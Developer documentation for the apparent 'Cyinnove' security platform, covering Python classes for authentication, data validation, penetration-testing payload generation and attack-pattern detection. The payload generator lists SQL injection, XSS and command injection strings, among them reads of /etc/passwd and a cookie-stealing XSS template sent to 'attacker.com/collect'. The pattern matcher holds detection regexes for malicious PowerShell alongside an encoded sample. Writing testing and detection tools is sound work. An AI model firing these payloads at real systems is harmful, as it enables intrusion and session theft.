# Cyinnove Component Documentation

## Overview

This document provides detailed documentation for individual components and modules that make up Cyinnove's security automation platform. Each component is designed to be modular, reusable, and easily integrated into larger security workflows.

## Table of Contents

- [Core Components](#core-components)
  - [Authentication Manager](#authentication-manager)
  - [Data Validator](#data-validator)
  - [Rate Limiter](#rate-limiter)
  - [Logger](#logger)
- [Security Components](#security-components)
  - [Payload Generator](#payload-generator)
  - [Response Analyzer](#response-analyzer)
  - [Certificate Validator](#certificate-validator)
  - [Network Scanner](#network-scanner)
- [Analysis Components](#analysis-components)
  - [Pattern Matcher](#pattern-matcher)
  - [Anomaly Detector](#anomaly-detector)
  - [Risk Calculator](#risk-calculator)
  - [Report Generator](#report-generator)
- [Integration Components](#integration-components)
  - [Webhook Handler](#webhook-handler)
  - [Database Connector](#database-connector)
  - [Message Queue](#message-queue)
  - [Cache Manager](#cache-manager)

## Core Components

### Authentication Manager

The Authentication Manager handles API authentication and token management across all Cyinnove services.

#### Class: `AuthenticationManager`

```python
class AuthenticationManager:
    """
    Manages authentication tokens and API keys for Cyinnove services
    
    This component handles token validation, refresh, and secure storage
    of authentication credentials.
    """
    
    def __init__(self, api_key: str, token_cache_ttl: int = 3600):
        """
        Initialize the authentication manager
        
        Args:
            api_key (str): Primary API key for authentication
            token_cache_ttl (int): Token cache time-to-live in seconds
        """
        self.api_key = api_key
        self.token_cache_ttl = token_cache_ttl
        self._token_cache = {}
        self._refresh_tokens = {}
    
    def validate_api_key(self, api_key: str) -> bool:
        """
        Validate an API key against the Cyinnove authentication service
        
        Args:
            api_key (str): API key to validate
            
        Returns:
            bool: True if valid, False otherwise
            
        Example:
            >>> auth_manager = AuthenticationManager("your_api_key")
            >>> is_valid = auth_manager.validate_api_key("test_key_123")
            >>> print(f"API key valid: {is_valid}")
        """
        if not api_key or len(api_key) < 32:
            return False
        
        # Validate format (should start with 'cy_' for Cyinnove keys)
        if not api_key.startswith('cy_'):
            return False
        
        # Make validation request to authentication service
        try:
            response = requests.post(
                'https://auth.cyinnove.org/v1/validate',
                headers={'Authorization': f'Bearer {api_key}'},
                timeout=10
            )
            return response.status_code == 200
        except requests.RequestException:
            return False
    
    def get_access_token(self, scope: str = 'default') -> Optional[str]:
        """
        Get or generate an access token for the specified scope
        
        Args:
            scope (str): Token scope (default, admin, readonly)
            
        Returns:
            Optional[str]: Access token if successful, None otherwise
            
        Example:
            >>> token = auth_manager.get_access_token('admin')
            >>> if token:
            ...     headers = {'Authorization': f'Bearer {token}'}
        """
        # Check cache first
        cache_key = f"{self.api_key}:{scope}"
        if cache_key in self._token_cache:
            token_data = self._token_cache[cache_key]
            if time.time() < token_data['expires_at']:
                return token_data['token']
        
        # Generate new token
        try:
            response = requests.post(
                'https://auth.cyinnove.org/v1/token',
                json={
                    'api_key': self.api_key,
                    'scope': scope,
                    'grant_type': 'api_key'
                },
                timeout=10
            )
            
            if response.status_code == 200:
                token_data = response.json()
                self._token_cache[cache_key] = {
                    'token': token_data['access_token'],
                    'expires_at': time.time() + token_data.get('expires_in', 3600)
                }
                return token_data['access_token']
        except requests.RequestException:
            pass
        
        return None
    
    def refresh_token(self, refresh_token: str) -> Optional[str]:
        """
        Refresh an expired access token
        
        Args:
            refresh_token (str): Refresh token
            
        Returns:
            Optional[str]: New access token if successful
        """
        try:
            response = requests.post(
                'https://auth.cyinnove.org/v1/token/refresh',
                json={
                    'refresh_token': refresh_token,
                    'grant_type': 'refresh_token'
                },
                timeout=10
            )
            
            if response.status_code == 200:
                return response.json()['access_token']
        except requests.RequestException:
            pass
        
        return None

# Usage Example
auth_manager = AuthenticationManager("cy_your_api_key_here")
if auth_manager.validate_api_key("cy_test_key"):
    token = auth_manager.get_access_token("admin")
    print(f"Access token: {token[:20]}...")
```

### Data Validator

The Data Validator component ensures data integrity and validates input parameters across all Cyinnove APIs.

#### Class: `DataValidator`

```python
import re
from typing import Any, Dict, List, Optional, Union
from enum import Enum

class ValidationError(Exception):
    """Custom exception for validation errors"""
    pass

class SeverityLevel(Enum):
    """Enumeration for vulnerability severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"

class DataValidator:
    """
    Comprehensive data validation component for security data
    
    This component validates various types of security-related data
    including vulnerability reports, threat indicators, and system configurations.
    """
    
    # Regex patterns for common validation
    IP_PATTERN = re.compile(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$')
    DOMAIN_PATTERN = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$')
    EMAIL_PATTERN = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
    CVE_PATTERN = re.compile(r'^CVE-\d{4}-\d{4,}$')
    HASH_PATTERNS = {
        'md5': re.compile(r'^[a-fA-F0-9]{32}$'),
        'sha1': re.compile(r'^[a-fA-F0-9]{40}$'),
        'sha256': re.compile(r'^[a-fA-F0-9]{64}$'),
        'sha512': re.compile(r'^[a-fA-F0-9]{128}$')
    }
    
    def validate_vulnerability(self, vulnerability_data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Validate vulnerability report data
        
        Args:
            vulnerability_data (Dict): Vulnerability data to validate
            
        Returns:
            Dict: Validated and normalized vulnerability data
            
        Raises:
            ValidationError: If validation fails
            
        Example:
            >>> validator = DataValidator()
            >>> vuln_data = {
            ...     "title": "SQL Injection in Login Form",
            ...     "description": "SQL injection vulnerability found",
            ...     "severity": "high",
            ...     "affected_assets": ["web-app-1"]
            ... }
            >>> validated = validator.validate_vulnerability(vuln_data)
        """
        errors = []
        validated_data = {}
        
        # Validate required fields
        required_fields = ['title', 'description', 'severity', 'affected_assets']
        for field in required_fields:
            if field not in vulnerability_data:
                errors.append(f"Missing required field: {field}")
            elif not vulnerability_data[field]:
                errors.append(f"Field cannot be empty: {field}")
        
        # Validate title
        if 'title' in vulnerability_data:
            title = vulnerability_data['title'].strip()
            if len(title) < 5:
                errors.append("Title must be at least 5 characters long")
            elif len(title) > 200:
                errors.append("Title cannot exceed 200 characters")
            else:
                validated_data['title'] = title
        
        # Validate description
        if 'description' in vulnerability_data:
            description = vulnerability_data['description'].strip()
            if len(description) < 20:
                errors.append("Description must be at least 20 characters long")
            elif len(description) > 5000:
                errors.append("Description cannot exceed 5000 characters")
            else:
                validated_data['description'] = description
        
        # Validate severity
        if 'severity' in vulnerability_data:
            severity = vulnerability_data['severity'].lower()
            if severity not in [s.value for s in SeverityLevel]:
                errors.append(f"Invalid severity. Must be one of: {', '.join([s.value for s in SeverityLevel])}")
            else:
                validated_data['severity'] = severity
        
        # Validate affected assets
        if 'affected_assets' in vulnerability_data:
            assets = vulnerability_data['affected_assets']
            if not isinstance(assets, list):
                errors.append("Affected assets must be a list")
            elif len(assets) == 0:
                errors.append("At least one affected asset must be specified")
            else:
                validated_assets = []
                for asset in assets:
                    if not isinstance(asset, str):
                        errors.append("Asset names must be strings")
                    elif len(asset.strip()) == 0:
                        errors.append("Asset names cannot be empty")
                    else:
                        validated_assets.append(asset.strip())
                validated_data['affected_assets'] = validated_assets
        
        # Validate optional CVE ID
        if 'cve_id' in vulnerability_data and vulnerability_data['cve_id']:
            cve_id = vulnerability_data['cve_id'].upper()
            if not self.CVE_PATTERN.match(cve_id):
                errors.append("Invalid CVE ID format. Must be CVE-YYYY-NNNN")
            else:
                validated_data['cve_id'] = cve_id
        
        if errors:
            raise ValidationError(f"Validation failed: {'; '.join(errors)}")
        
        return validated_data
    
    def validate_threat_indicator(self, indicator: str, indicator_type: str) -> bool:
        """
        Validate threat indicators (IOCs)
        
        Args:
            indicator (str): The indicator value
            indicator_type (str): Type of indicator (ip, domain, hash, email, url)
            
        Returns:
            bool: True if valid, False otherwise
            
        Example:
            >>> validator = DataValidator()
            >>> is_valid_ip = validator.validate_threat_indicator("192.168.1.1", "ip")
            >>> is_valid_domain = validator.validate_threat_indicator("example.com", "domain")
        """
        if not indicator or not indicator_type:
            return False
        
        indicator = indicator.strip()
        indicator_type = indicator_type.lower()
        
        validators = {
            'ip': self._validate_ip,
            'domain': self._validate_domain,
            'hash': self._validate_hash,
            'email': self._validate_email,
            'url': self._validate_url
        }
        
        validator_func = validators.get(indicator_type)
        if not validator_func:
            return False
        
        return validator_func(indicator)
    
    def _validate_ip(self, ip: str) -> bool:
        """Validate IP address"""
        if not self.IP_PATTERN.match(ip):
            return False
        
        # Check if octets are in valid range
        octets = ip.split('.')
        for octet in octets:
            if int(octet) > 255:
                return False
        
        return True
    
    def _validate_domain(self, domain: str) -> bool:
        """Validate domain name"""
        if len(domain) > 253:
            return False
        
        return bool(self.DOMAIN_PATTERN.match(domain))
    
    def _validate_hash(self, hash_value: str) -> bool:
        """Validate hash values (MD5, SHA1, SHA256, SHA512)"""
        for hash_type, pattern in self.HASH_PATTERNS.items():
            if pattern.match(hash_value):
                return True
        return False
    
    def _validate_email(self, email: str) -> bool:
        """Validate email address"""
        return bool(self.EMAIL_PATTERN.match(email))
    
    def _validate_url(self, url: str) -> bool:
        """Validate URL"""
        try:
            from urllib.parse import urlparse
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except Exception:
            return False

# Usage Example
validator = DataValidator()

# Validate vulnerability data
vuln_data = {
    "title": "SQL Injection in User Login",
    "description": "A SQL injection vulnerability was discovered in the user authentication system that allows attackers to bypass login controls.",
    "severity": "high",
    "affected_assets": ["web-app-1", "database-server-1"],
    "cve_id": "CVE-2024-1234"
}

try:
    validated_vuln = validator.validate_vulnerability(vuln_data)
    print("Vulnerability data is valid")
except ValidationError as e:
    print(f"Validation error: {e}")

# Validate threat indicators
indicators = [
    ("192.168.1.100", "ip"),
    ("malicious-site.com", "domain"),
    ("e3b0c44298fc1c149afbf4c8996fb924", "hash"),
    ("attacker@evil.com", "email")
]

for indicator, ioc_type in indicators:
    is_valid = validator.validate_threat_indicator(indicator, ioc_type)
    print(f"{ioc_type.upper()} '{indicator}' is {'valid' if is_valid else 'invalid'}")
```

## Security Components

### Payload Generator

The Payload Generator creates various payloads for security testing and vulnerability assessment.

#### Class: `PayloadGenerator`

```python
import random
import string
from typing import List, Dict, Optional
from enum import Enum

class PayloadType(Enum):
    """Enumeration for payload types"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    LDAP_INJECTION = "ldap_injection"
    XXE = "xxe"
    SSRF = "ssrf"

class PayloadGenerator:
    """
    Advanced payload generator for security testing
    
    This component generates various types of security testing payloads
    for vulnerability assessment and penetration testing.
    """
    
    def __init__(self):
        """Initialize the payload generator with predefined payloads"""
        self._initialize_payloads()
    
    def _initialize_payloads(self):
        """Initialize payload templates"""
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "'; DROP TABLE users--",
            "' OR 1=1--",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "' AND (SELECT COUNT(*) FROM users) > 0--"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>"
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "| ls -la",
            "&& ls -la",
            "|| ls -la",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "&& whoami"
        ]
        
        self.ldap_injection_payloads = [
            "*",
            "*)(&",
            "*)(uid=*",
            "*)(|(uid=*",
            "*))%00",
            "admin)(&(password=*",
            "*)(|(password=*"
        ]
    
    def generate_sql_injection_payloads(self, 
                                      parameter_name: str = None,
                                      include_time_based: bool = True) -> List[Dict[str, str]]:
        """
        Generate SQL injection payloads
        
        Args:
            parameter_name (str, optional): Target parameter name
            include_time_based (bool): Include time-based blind SQL injection payloads
            
        Returns:
            List[Dict]: List of SQL injection payloads with metadata
            
        Example:
            >>> generator = PayloadGenerator()
            >>> payloads = generator.generate_sql_injection_payloads("username")
            >>> for payload in payloads[:3]:
            ...     print(f"Payload: {payload['payload']}")
            ...     print(f"Type: {payload['type']}")
        """
        payloads = []
        
        # Basic SQL injection payloads
        for payload in self.sql_payloads:
            payloads.append({
                'payload': payload,
                'type': 'boolean_based',
                'parameter': parameter_name,
                'description': 'Boolean-based SQL injection payload',
                'risk_level': 'high'
            })
        
        # Time-based blind SQL injection payloads
        if include_time_based:
            time_payloads = [
                "' OR (SELECT COUNT(*) FROM users WHERE SUBSTR(password,1,1)='a') > 0 AND SLEEP(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR pg_sleep(5)--",
                "' UNION SELECT SLEEP(5)--"
            ]
            
            for payload in time_payloads:
                payloads.append({
                    'payload': payload,
                    'type': 'time_based',
                    'parameter': parameter_name,
                    'description': 'Time-based blind SQL injection payload',
                    'risk_level': 'high',
                    'delay_seconds': 5
                })
        
        return payloads
    
    def generate_xss_payloads(self, 
                             context: str = 'generic',
                             include_advanced: bool = True) -> List[Dict[str, str]]:
        """
        Generate Cross-Site Scripting (XSS) payloads
        
        Args:
            context (str): Context where XSS will be tested (generic, attribute, script)
            include_advanced (bool): Include advanced evasion techniques
            
        Returns:
            List[Dict]: List of XSS payloads with metadata
        """
        payloads = []
        
        # Basic XSS payloads
        for payload in self.xss_payloads:
            payloads.append({
                'payload': payload,
                'type': 'reflected',
                'context': context,
                'description': 'Basic XSS payload',
                'risk_level': 'medium'
            })
        
        # Context-specific payloads
        if context == 'attribute':
            attribute_payloads = [
                '" onmouseover="alert(\'XSS\')"',
                '" onfocus="alert(\'XSS\')" autofocus="',
                '" onclick="alert(\'XSS\')"',
                '\' onmouseover=\'alert("XSS")\''
            ]
            
            for payload in attribute_payloads:
                payloads.append({
                    'payload': payload,
                    'type': 'attribute_based',
                    'context': 'attribute',
                    'description': 'Attribute-based XSS payload',
                    'risk_level': 'medium'
                })
        
        # Advanced evasion techniques
        if include_advanced:
            advanced_payloads = [
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
                "<svg/onload=alert(1)>",
                "<iframe srcdoc=\"<script>alert(1)</script>\">",
                "<%73%63%72%69%70%74>alert(1)<%2f%73%63%72%69%70%74>"
            ]
            
            for payload in advanced_payloads:
                payloads.append({
                    'payload': payload,
                    'type': 'evasion',
                    'context': 'advanced',
                    'description': 'Advanced XSS evasion payload',
                    'risk_level': 'high'
                })
        
        return payloads
    
    def generate_command_injection_payloads(self, 
                                          os_type: str = 'unix') -> List[Dict[str, str]]:
        """
        Generate command injection payloads
        
        Args:
            os_type (str): Target OS type (unix, windows, generic)
            
        Returns:
            List[Dict]: List of command injection payloads
        """
        payloads = []
        
        if os_type.lower() in ['unix', 'linux', 'generic']:
            unix_payloads = [
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "&& cat /etc/passwd",
                "; ls -la /",
                "| ls -la /",
                "&& ls -la /",
                "; id",
                "| id",
                "&& id",
                "; uname -a",
                "$(cat /etc/passwd)",
                "`cat /etc/passwd`"
            ]
            
            for payload in unix_payloads:
                payloads.append({
                    'payload': payload,
                    'type': 'command_injection',
                    'os_type': 'unix',
                    'description': 'Unix/Linux command injection payload',
                    'risk_level': 'critical'
                })
        
        if os_type.lower() in ['windows', 'generic']:
            windows_payloads = [
                "& dir",
                "| dir",
                "&& dir",
                "; dir",
                "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "&& whoami",
                "; whoami"
            ]
            
            for payload in windows_payloads:
                payloads.append({
                    'payload': payload,
                    'type': 'command_injection',
                    'os_type': 'windows',
                    'description': 'Windows command injection payload',
                    'risk_level': 'critical'
                })
        
        return payloads
    
    def generate_custom_payload(self, 
                               payload_type: PayloadType,
                               target_parameter: str,
                               custom_values: Dict[str, str] = None) -> Dict[str, str]:
        """
        Generate a custom payload based on specific requirements
        
        Args:
            payload_type (PayloadType): Type of payload to generate
            target_parameter (str): Target parameter name
            custom_values (Dict, optional): Custom values to include in payload
            
        Returns:
            Dict: Custom payload with metadata
        """
        custom_values = custom_values or {}
        
        if payload_type == PayloadType.SQL_INJECTION:
            base_payload = random.choice(self.sql_payloads)
            if 'table_name' in custom_values:
                base_payload = f"' UNION SELECT * FROM {custom_values['table_name']}--"
        
        elif payload_type == PayloadType.XSS:
            base_payload = random.choice(self.xss_payloads)
            if 'callback_url' in custom_values:
                base_payload = f"<script>fetch('{custom_values['callback_url']}?data='+document.cookie)</script>"
        
        elif payload_type == PayloadType.COMMAND_INJECTION:
            base_payload = random.choice(self.command_injection_payloads)
            if 'command' in custom_values:
                base_payload = f"; {custom_values['command']}"
        
        else:
            base_payload = "test_payload"
        
        return {
            'payload': base_payload,
            'type': payload_type.value,
            'parameter': target_parameter,
            'custom_values': custom_values,
            'description': f'Custom {payload_type.value} payload',
            'risk_level': 'high'
        }

# Usage Example
generator = PayloadGenerator()

# Generate SQL injection payloads
sql_payloads = generator.generate_sql_injection_payloads("username", include_time_based=True)
print(f"Generated {len(sql_payloads)} SQL injection payloads")

# Generate XSS payloads for different contexts
xss_payloads = generator.generate_xss_payloads("attribute", include_advanced=True)
print(f"Generated {len(xss_payloads)} XSS payloads")

# Generate command injection payloads
cmd_payloads = generator.generate_command_injection_payloads("unix")
print(f"Generated {len(cmd_payloads)} command injection payloads")

# Generate custom payload
custom_payload = generator.generate_custom_payload(
    PayloadType.XSS,
    "comment",
    {"callback_url": "https://attacker.com/collect"}
)
print(f"Custom payload: {custom_payload['payload']}")
```

## Analysis Components

### Pattern Matcher

The Pattern Matcher component identifies security patterns and signatures in various data types.

#### Class: `PatternMatcher`

```python
import re
from typing import List, Dict, Pattern, Optional, Tuple
from dataclasses import dataclass

@dataclass
class MatchResult:
    """Data class for pattern match results"""
    pattern_name: str
    matched_text: str
    start_position: int
    end_position: int
    confidence: float
    metadata: Dict[str, str]

class PatternMatcher:
    """
    Advanced pattern matching component for security analysis
    
    This component identifies security-related patterns in text, code,
    network traffic, and other data sources.
    """
    
    def __init__(self):
        """Initialize pattern matcher with security patterns"""
        self._initialize_patterns()
    
    def _initialize_patterns(self):
        """Initialize security-related regex patterns"""
        self.vulnerability_patterns = {
            'sql_injection_error': re.compile(
                r'(mysql_fetch_array|ORA-\d+|Microsoft OLE DB Provider|'
                r'PostgreSQL query failed|SQLite error|'
                r'Warning: mysql_|Error: mysql_)',
                re.IGNORECASE
            ),
            'xss_reflection': re.compile(
                r'<script[^>]*>.*?</script>|'
                r'javascript:[^"\']*|'
                r'on\w+\s*=\s*["\'][^"\']*["\']',
                re.IGNORECASE | re.DOTALL
            ),
            'command_injection_output': re.compile(
                r'(uid=\d+\([^)]+\)|'
                r'total \d+|'
                r'drwx|'
                r'Microsoft Windows|'
                r'Directory of [A-Z]:|'
                r'Volume Serial Number)',
                re.IGNORECASE
            ),
            'path_traversal': re.compile(
                r'(\.\./){2,}|'
                r'\.\.\\|'
                r'%2e%2e%2f|'
                r'%252e%252e%252f',
                re.IGNORECASE
            ),
            'sensitive_data_exposure': re.compile(
                r'(password\s*[:=]\s*["\']?\w+|'
                r'api[_-]?key\s*[:=]\s*["\']?[\w-]+|'
                r'secret\s*[:=]\s*["\']?\w+|'
                r'token\s*[:=]\s*["\']?[\w.-]+)',
                re.IGNORECASE
            )
        }
        
        self.malware_patterns = {
            'suspicious_powershell': re.compile(
                r'(powershell\s+.*?-enc\s+|'
                r'Invoke-Expression|'
                r'IEX\s*\(|'
                r'DownloadString|'
                r'-ExecutionPolicy\s+Bypass)',
                re.IGNORECASE
            ),
            'base64_payload': re.compile(
                r'[A-Za-z0-9+/]{50,}={0,2}',
                re.MULTILINE
            ),
            'suspicious_urls': re.compile(
                r'https?://(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}'
                r'(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)|'
                r'https?://[a-z0-9.-]+\.(?:tk|ml|ga|cf|bit\.ly)',
                re.IGNORECASE
            ),
            'obfuscated_javascript': re.compile(
                r'eval\s*\(\s*(?:unescape|String\.fromCharCode|atob)|'
                r'document\.write\s*\(\s*unescape|'
                r'\\x[0-9a-f]{2}',
                re.IGNORECASE
            )
        }
        
        self.network_patterns = {
            'port_scan': re.compile(
                r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*?'
                r'(?:(?:\d{1,5}[,\s]){10,})',
                re.MULTILINE
            ),
            'brute_force': re.compile(
                r'(failed|invalid|incorrect).*?'
                r'(login|authentication|password).*?'
                r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',
                re.IGNORECASE
            ),
            'dos_attack': re.compile(
                r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*?'
                r'(?:(?:GET|POST|HEAD)\s+.*?){100,}',
                re.MULTILINE
            )
        }
    
    def analyze_text(self, 
                     text: str, 
                     pattern_categories: List[str] = None) -> List[MatchResult]:
        """
        Analyze text for security patterns
        
        Args:
            text (str): Text to analyze
            pattern_categories (List[str], optional): Categories to check 
                                                     (vulnerability, malware, network)
        
        Returns:
            List[MatchResult]: List of pattern matches found
            
        Example:
            >>> matcher = PatternMatcher()
            >>> text = "Error: mysql_fetch_array() expects parameter 1"
            >>> results = matcher.analyze_text(text, ["vulnerability"])
            >>> for result in results:
            ...     print(f"Found {result.pattern_name}: {result.matched_text}")
        """
        if pattern_categories is None:
            pattern_categories = ['vulnerability', 'malware', 'network']
        
        results = []
        
        # Check vulnerability patterns
        if 'vulnerability' in pattern_categories:
            results.extend(self._check_patterns(text, self.vulnerability_patterns, 'vulnerability'))
        
        # Check malware patterns
        if 'malware' in pattern_categories:
            results.extend(self._check_patterns(text, self.malware_patterns, 'malware'))
        
        # Check network patterns
        if 'network' in pattern_categories:
            results.extend(self._check_patterns(text, self.network_patterns, 'network'))
        
        # Sort results by confidence score (descending)
        results.sort(key=lambda x: x.confidence, reverse=True)
        
        return results
    
    def _check_patterns(self, 
                       text: str, 
                       patterns: Dict[str, Pattern], 
                       category: str) -> List[MatchResult]:
        """
        Check text against a set of patterns
        
        Args:
            text (str): Text to check
            patterns (Dict[str, Pattern]): Patterns to match against
            category (str): Category of patterns
            
        Returns:
            List[MatchResult]: Matches found
        """
        results = []
        
        for pattern_name, pattern in patterns.items():
            matches = pattern.finditer(text)
            
            for match in matches:
                confidence = self._calculate_confidence(pattern_name, match.group(), category)
                
                result = MatchResult(
                    pattern_name=pattern_name,
                    matched_text=match.group(),
                    start_position=match.start(),
                    end_position=match.end(),
                    confidence=confidence,
                    metadata={
                        'category': category,
                        'length': len(match.group()),
                        'groups': list(match.groups()) if match.groups() else []
                    }
                )
                results.append(result)
        
        return results
    
    def _calculate_confidence(self, pattern_name: str, matched_text: str, category: str) -> float:
        """
        Calculate confidence score for a pattern match
        
        Args:
            pattern_name (str): Name of the matched pattern
            matched_text (str): The matched text
            category (str): Pattern category
            
        Returns:
            float: Confidence score (0.0 to 1.0)
        """
        base_confidence = 0.7
        
        # Adjust confidence based on pattern specificity
        high_confidence_patterns = [
            'sql_injection_error',
            'command_injection_output',
            'suspicious_powershell'
        ]
        
        if pattern_name in high_confidence_patterns:
            base_confidence = 0.9
        
        # Adjust based on match length
        if len(matched_text) > 50:
            base_confidence += 0.05
        elif len(matched_text) < 10:
            base_confidence -= 0.1
        
        # Ensure confidence is within bounds
        return max(0.0, min(1.0, base_confidence))
    
    def find_indicators_of_compromise(self, text: str) -> Dict[str, List[str]]:
        """
        Extract Indicators of Compromise (IOCs) from text
        
        Args:
            text (str): Text to analyze for IOCs
            
        Returns:
            Dict[str, List[str]]: Dictionary of IOC types and their values
            
        Example:
            >>> matcher = PatternMatcher()
            >>> text = "Malicious traffic from 192.168.1.100 to evil.com"
            >>> iocs = matcher.find_indicators_of_compromise(text)
            >>> print(f"IPs found: {iocs.get('ips', [])}")
        """
        iocs = {
            'ips': [],
            'domains': [],
            'urls': [],
            'hashes': [],
            'emails': []
        }
        
        # IP addresses
        ip_pattern = re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b')
        iocs['ips'] = list(set(ip_pattern.findall(text)))
        
        # Domain names
        domain_pattern = re.compile(r'\b[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+\b')
        iocs['domains'] = list(set(domain_pattern.findall(text)))
        
        # URLs
        url_pattern = re.compile(r'https?://[^\s<>"\']+')
        iocs['urls'] = list(set(url_pattern.findall(text)))
        
        # Hash values
        hash_patterns = [
            re.compile(r'\b[a-fA-F0-9]{32}\b'),  # MD5
            re.compile(r'\b[a-fA-F0-9]{40}\b'),  # SHA1
            re.compile(r'\b[a-fA-F0-9]{64}\b'),  # SHA256
        ]
        
        for pattern in hash_patterns:
            iocs['hashes'].extend(pattern.findall(text))
        iocs['hashes'] = list(set(iocs['hashes']))
        
        # Email addresses
        email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
        iocs['emails'] = list(set(email_pattern.findall(text)))
        
        return iocs
    
    def detect_attack_patterns(self, log_entries: List[str]) -> Dict[str, int]:
        """
        Detect attack patterns in log entries
        
        Args:
            log_entries (List[str]): List of log entries to analyze
            
        Returns:
            Dict[str, int]: Dictionary of attack types and their occurrence counts
        """
        attack_counts = {
            'sql_injection': 0,
            'xss': 0,
            'brute_force': 0,
            'directory_traversal': 0,
            'command_injection': 0
        }
        
        for entry in log_entries:
            # Check for SQL injection attempts
            if re.search(r"('|\"|%27|%22).*(union|select|insert|update|delete|drop)", entry, re.IGNORECASE):
                attack_counts['sql_injection'] += 1
            
            # Check for XSS attempts
            if re.search(r"(<script|javascript:|on\w+\s*=)", entry, re.IGNORECASE):
                attack_counts['xss'] += 1
            
            # Check for brute force attempts
            if re.search(r"(login|auth|password).*fail", entry, re.IGNORECASE):
                attack_counts['brute_force'] += 1
            
            # Check for directory traversal
            if re.search(r"(\.\./|%2e%2e%2f|\.\.\\)", entry, re.IGNORECASE):
                attack_counts['directory_traversal'] += 1
            
            # Check for command injection
            if re.search(r"(;|&|\|).*(ls|dir|cat|type|whoami|id|uname)", entry, re.IGNORECASE):
                attack_counts['command_injection'] += 1
        
        return attack_counts

# Usage Example
matcher = PatternMatcher()

# Analyze suspicious text
suspicious_text = """
Error: mysql_fetch_array() expects parameter 1 to be resource
<script>alert('XSS')</script>
powershell -enc JABhAD0AJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwA=
"""

results = matcher.analyze_text(suspicious_text)
for result in results:
    print(f"Pattern: {result.pattern_name}")
    print(f"Match: {result.matched_text}")
    print(f"Confidence: {result.confidence:.2f}")
    print("---")

# Extract IOCs
iocs = matcher.find_indicators_of_compromise("Traffic from 192.168.1.100 to malicious-site.com detected")
print(f"IOCs found: {iocs}")

# Detect attack patterns in logs
log_entries = [
    "GET /login.php?username=admin' OR '1'='1 HTTP/1.1",
    "POST /comment.php comment=<script>alert('XSS')</script>",
    "Failed login attempt for user admin from 192.168.1.100"
]

attack_patterns = matcher.detect_attack_patterns(log_entries)
print(f"Attack patterns detected: {attack_patterns}")
```

---

This component documentation provides detailed information about the core building blocks of Cyinnove's security platform. Each component is designed to be:

1. **Modular**: Can be used independently or combined with other components
2. **Well-documented**: Comprehensive docstrings and usage examples
3. **Extensible**: Easy to extend with additional functionality
4. **Production-ready**: Includes proper error handling and validation
5. **Security-focused**: Built specifically for security use cases

For more information about integrating these components into your security workflows, refer to the main API documentation and SDK guides.